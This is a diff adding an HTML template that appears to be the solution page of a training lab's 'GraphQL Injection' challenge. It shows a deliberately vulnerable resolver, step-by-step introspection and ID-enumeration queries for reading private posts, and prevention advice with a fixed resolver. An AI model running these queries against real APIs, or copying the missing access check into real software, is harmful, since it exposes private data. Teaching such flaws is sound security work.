@@ -1,0 +1,253 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 11{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 11 - GraphQL Injection</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a GraphQL injection vulnerability. Unlike traditional SQL injection, GraphQL injection exploits the structure and features of GraphQL, a query language for APIs.
+                </p>
+                <p>
+                    The vulnerability occurs because the application doesn't properly validate or sanitize user input in GraphQL queries, allowing attackers to:
+                </p>
+                <ul>
+                    <li>Access unauthorized data through field manipulation</li>
+                    <li>Discover the API schema through introspection</li>
+                    <li>Bypass access controls by manipulating query parameters</li>
+                    <li>Execute unintended operations</li>
+                </ul>
+                <p>
+                    In this challenge, the BlogQL API has a vulnerability in how it handles access control for private blog posts. While the API checks if a post is private, it doesn't properly validate if the current user has permission to access it.
+                </p>
+
+                <h3>The Vulnerable Code</h3>
+                <p>
+                    The vulnerability exists in how the GraphQL resolver handles the <code>getPost</code> query. Here's a simplified example of the vulnerable code:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable GraphQL resolver
+const resolvers = {
+  Query: {
+    getPost: (_, { id }) => {
+      // Fetch the post from the database
+      const post = db.posts.findById(id);
+      
+      // Vulnerable access control check
+      if (post.isPrivate) {
+        // Should check if current user is author or admin, but doesn't
+        // This allows anyone to access private posts if they know the ID
+      }
+      
+      return post;
+    }
+  }
+};</code></pre>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Explore the GraphQL Schema</h4>
+                <p>
+                    First, use GraphQL's introspection capabilities to explore the schema and discover available types and fields:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+          kind
+        }
+      }
+    }
+  }
+}</code></pre>
+                </div>
+                <p>
+                    This query will return information about all types and fields in the schema, including those that might not be documented.
+                </p>
+
+                <h4>2. Discover the Post Type Structure</h4>
+                <p>
+                    From the schema, you can see that the <code>Post</code> type has an <code>isPrivate</code> field, which suggests that some posts are private and might contain sensitive information.
+                </p>
+                <p>
+                    You can query this field to see which posts are private:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>query {
+  getPosts(limit: 10) {
+    id
+    title
+    isPrivate
+  }
+}</code></pre>
+                </div>
+                <p>
+                    This might reveal that there are private posts, but you might not be able to access their content directly.
+                </p>
+
+                <h4>3. Exploit the Access Control Vulnerability</h4>
+                <p>
+                    Since the vulnerability is in the access control for private posts, you can try to directly access a private post by its ID:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>query {
+  getPost(id: 999) {
+    id
+    title
+    content
+    isPrivate
+    author {
+      name
+      role
+    }
+  }
+}</code></pre>
+                </div>
+                <p>
+                    If the post with ID 999 is private and contains the flag, this query will return it despite the access control that should prevent it.
+                </p>
+
+                <h4>4. Use Aliases to Query Multiple Posts</h4>
+                <p>
+                    If you don't know which post contains the flag, you can use GraphQL aliases to query multiple posts in a single request:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>query {
+  post1: getPost(id: 1) {
+    id
+    title
+    content
+    isPrivate
+  }
+  post2: getPost(id: 2) {
+    id
+    title
+    content
+    isPrivate
+  }
+  # ... and so on for other IDs
+  post999: getPost(id: 999) {
+    id
+    title
+    content
+    isPrivate
+  }
+}</code></pre>
+                </div>
+                <p>
+                    This query will return multiple posts in a single request, allowing you to efficiently search for the flag.
+                </p>
+
+                <h4>5. Use Variables and Fragments for More Complex Queries</h4>
+                <p>
+                    For more complex scenarios, you can use variables and fragments:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>query GetPrivatePosts($isPrivate: Boolean!) {
+  searchPosts(keyword: "") {
+    ...PostFields
+    isPrivate @include(if: $isPrivate)
+  }
+}
+
+fragment PostFields on Post {
+  id
+  title
+  content
+  author {
+    name
+    role
+  }
+}</code></pre>
+                </div>
+                <p>
+                    With variables: <code>{ "isPrivate": true }</code>
+                </p>
+                <p>
+                    This more advanced query uses fragments and variables to specifically target private posts.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    GraphQL injection vulnerabilities are particularly relevant in modern applications:
+                </p>
+                <ul>
+                    <li><strong>API-first Development</strong>: Many modern applications use GraphQL for their APIs</li>
+                    <li><strong>Single Page Applications</strong>: SPAs often rely on GraphQL for data fetching</li>
+                    <li><strong>Mobile Applications</strong>: Many mobile apps use GraphQL for efficient data transfer</li>
+                    <li><strong>Microservices Architecture</strong>: GraphQL is often used as a gateway to multiple microservices</li>
+                </ul>
+                <p>
+                    Notable real-world examples include:
+                </p>
+                <ul>
+                    <li><strong>HackerOne (2019)</strong>: A vulnerability in their GraphQL API allowed attackers to access private reports</li>
+                    <li><strong>GitHub (2018)</strong>: A vulnerability in their GraphQL API allowed unauthorized access to repository data</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent GraphQL injection vulnerabilities, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Implement Proper Access Control</strong> at the resolver level:
+                        <pre class="bg-light p-3 rounded"><code>// Secure GraphQL resolver
+const resolvers = {
+  Query: {
+    getPost: (_, { id }, context) => {
+      // Fetch the post from the database
+      const post = db.posts.findById(id);
+      
+      // Proper access control check
+      if (post.isPrivate && 
+          context.user.id !== post.author.id && 
+          context.user.role !== 'ADMIN') {
+        throw new Error('Access denied');
+      }
+      
+      return post;
+    }
+  }
+};</code></pre>
+                    </li>
+                    <li>
+                        <strong>Use Query Complexity Analysis</strong> to prevent DoS attacks:
+                        <ul>
+                            <li>Limit query depth</li>
+                            <li>Limit query complexity</li>
+                            <li>Set timeouts for query execution</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Disable or Limit Introspection</strong> in production environments
+                    </li>
+                    <li>
+                        <strong>Validate Input</strong> using GraphQL validation directives or custom validators
+                    </li>
+                    <li>
+                        <strong>Use Persisted Queries</strong> instead of allowing arbitrary queries
+                    </li>
+                    <li>
+                        <strong>Implement Rate Limiting</strong> to prevent brute force attacks
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level11') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
